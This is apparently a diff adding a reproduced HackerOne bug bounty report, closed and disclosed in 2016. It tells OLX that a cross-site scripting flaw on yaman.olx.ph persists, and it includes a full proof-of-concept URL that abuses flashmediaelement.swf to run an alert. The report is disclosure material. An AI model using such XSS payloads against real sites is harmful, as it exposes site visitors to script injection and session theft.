@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/151310
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/hacklikeapro
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:25.07.2016 15:04:37
+
+Summary:
+
+Hi,
+I check an issue related to xss after public disclosure,  on your site: yaman.olx.ph
+Seams that vulnerability still exist. 
+link: http://yaman.olx.ph/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert%60XSS%20%60
+
+Best regards,
+Ary Dobrovolskiy
